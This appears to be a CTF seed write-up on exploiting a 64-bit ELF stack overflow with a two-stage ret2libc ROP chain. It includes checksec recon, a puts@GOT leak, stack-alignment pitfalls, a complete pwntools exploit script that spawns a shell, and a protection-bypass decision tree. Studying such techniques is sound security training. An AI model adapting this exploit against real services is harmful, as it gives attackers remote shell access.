# [Seed] CTF Pwn — x64 Stack Overflow + ROP Chain Calling system

## Scenario Classification
CTF / Binary Exploitation

## Target Overview
A 64-bit ELF with a `read()` buffer overflow vulnerability. The binary has NX (non-executable stack) but no PIE, no stack canary. Utilize ROP gadgets to call libc's `system("/bin/sh")` and get a shell.

## Complete Execution Chain

1. Basic Reconnaissance
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Analyze main with IDA / Ghidra → Discover `read(0, buf, 0x100)` but `buf` is only 0x40 bytes
3. Calculate Overflow Offset
   ```bash
   pwndbg> cyclic 200
   # Input to the target program, crash after looking at RSP
   pwndbg> cyclic -l 0x6161616c
   # Offset = 72
   ```
4. Since there's no PIE, PLT and GOT are fixed addresses
5. First Phase (no libc info): Leak `puts@GOT` content to calculate libc base
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # Return to main for secondary exploitation
   ```
6. Receive puts output, locate libc version (query libc-database)
7. Second Phase: Construct system("/bin/sh")
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. Get shell → cat flag

## Pitfall Records

| Issue | Reason | Solution | Time |
|-------|--------|----------|------|
| ROP calling system crashes, no shell | Stack not aligned to 16 bytes (Ubuntu 18.04+ strict on movaps) | Add a ret gadget before system for padding | 30min |
| Local works but remote doesn't | Inconsistent libc version | Leak a function address with puts → Query libc-database for exact version | 40min |
| pwntools recv hangs | Program output uses setbuf(NULL) but remote stderr buffer not closed | Use sendlineafter / recvuntil for precise synchronization | 15min |
| One SIGPIPE on every remote attempt | Second phase payload still using the old io object | After `process` / `remote`, reuse the same connection, main process dead means done | 20min |
| ROPgadget outputs too much | Tool defaults to listing all gadgets | `ROPgadget --binary vuln --only "pop\|ret"` for filtering | 5min |

## Toolchain Discovery

- **pwntools** is the de facto standard for writing exploits in Python (`from pwn import *`)
- **pwndbg** is 10 times stronger than GDB's built-in features (with cyclic / vmmap / heap commands)
- **ROPgadget** vs **ropper**: ropper outputs more friendly and supports syscall chain search
- **libc-database** matches the exact libc version through a leaked libc function address
- **one_gadget** finds a libc gadget that can directly execve("/bin/sh"), shorter than manual ROP

## Key Code/Commands

Full exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # For stack alignment

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Suggestions for Improvements

- CTF-Sandbox-Orchestrator's `competition-reverse-pwn` should add `pwn-rop-cheatsheet.md`, making this process a template
- Add pwntools / pwndbg / one_gadget to the bootstrap manifest

## Reusable Patterns/Script Snippets

**ROP Exploit Decision Tree**:

```text
checksec → Check protections
├── No NX → Direct shellcode (old approach)
├── NX + No PIE → Classic ret2libc
├── NX + PIE + No Canary → Leak PIE base → ret2libc
├── Has Canary → Find a way to leak the Canary (format string / off-by-one)
└── Full RELRO + Canary + PIE → Difficult, common methods: fork without ASLR / __libc_start_main / SROP
```

**Leaking libc → Use the standard two-stage payload**:

```text
Stage 1: leak puts@GOT → Calculate libc base → Return to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## Evolution Actions
- [ ] CTF orchestrator add pwn quick reference page
- [ ] Add pwntools / pwndbg / one_gadget to bootstrap-manifest
- [ ] Reference this case in reverse-engineering/tools-dynamic.md

## Environment Information
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, pwndbg latest, ROPgadget 7.x
- libc version: glibc 2.31 / 2.35 (common in CTFs)
- Target architecture: x86_64

## Desensitization Requirements
This entry is seed data based on publicly available CTF techniques and does not involve any real CTF challenges or proprietary systems.